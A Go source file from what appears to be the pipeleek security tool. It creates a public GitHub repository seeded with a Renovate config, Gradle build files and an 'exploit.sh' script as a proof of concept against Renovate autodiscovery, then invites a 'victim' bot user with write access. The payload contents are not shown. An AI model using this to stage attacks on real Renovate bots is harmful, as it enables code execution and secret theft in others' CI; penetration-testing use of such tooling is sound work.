package renovate

import (
	"context"
	"time"

	"github.com/CompassSecurity/pipeleek/pkg/format"
	pkgrenovate "github.com/CompassSecurity/pipeleek/pkg/renovate"
	"github.com/google/go-github/v69/github"
	"github.com/rs/zerolog/log"
)

// RunGenerate creates a GitHub repository with Renovate autodiscovery exploit PoC.
func RunGenerate(client *github.Client, repoName, username string) {
	ctx := context.Background()

	if repoName == "" {
		repoName = format.RandomStringN(5) + "-pipeleek-renovate-autodiscovery-poc"
	}

	repo := &github.Repository{
		Name:        github.Ptr(repoName),
		Description: github.Ptr("Pipeleek Renovate Autodiscovery PoC"),
		Private:     github.Ptr(false),
	}

	createdRepo, _, err := client.Repositories.Create(ctx, "", repo)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating repository")
	}
	log.Info().Str("name", createdRepo.GetName()).Str("url", createdRepo.GetHTMLURL()).Msg("Created repository")

	time.Sleep(2 * time.Second)

	createFile(ctx, client, createdRepo, "renovate.json", pkgrenovate.RenovateJSON)
	createFile(ctx, client, createdRepo, "build.gradle", pkgrenovate.BuildGradle)
	createFile(ctx, client, createdRepo, "gradlew", pkgrenovate.GradlewScript)
	createFile(ctx, client, createdRepo, "gradle/wrapper/gradle-wrapper.properties", pkgrenovate.GradleWrapperProperties)
	createFile(ctx, client, createdRepo, "exploit.sh", pkgrenovate.ExploitScript)

	if username == "" {
		log.Warn().Msg("No username provided, you must invite the victim Renovate Bot user manually to the created repository")
		log.Info().Msg("Go to: " + createdRepo.GetHTMLURL() + "/settings/access")
	} else {
		invite(ctx, client, createdRepo, username)
	}

	log.Info().Msg(pkgrenovate.ExploitExplanation)
}

func invite(ctx context.Context, client *github.Client, repo *github.Repository, username string) {
	log.Info().Str("user", username).Msg("Inviting user to repository")

	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()

	_, _, err := client.Repositories.AddCollaborator(ctx, owner, repoName, username, &github.RepositoryAddCollaboratorOptions{
		Permission: "write",
	})

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed inviting user to repository, do it manually")
	}

	log.Info().Str("user", username).Msg("Successfully invited user to repository")
}

func createFile(ctx context.Context, client *github.Client, repo *github.Repository, filePath string, content string) {
	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()

	opts := &github.RepositoryContentFileOptions{
		Message: github.Ptr("Pipeleek create " + filePath),
		Content: []byte(content),
		Branch:  github.Ptr("main"),
	}

	_, _, err := client.Repositories.CreateFile(ctx, owner, repoName, filePath, opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Str("fileName", filePath).Msg("Creating file failed")
	}

	log.Debug().Str("file", filePath).Msg("Created file")
}
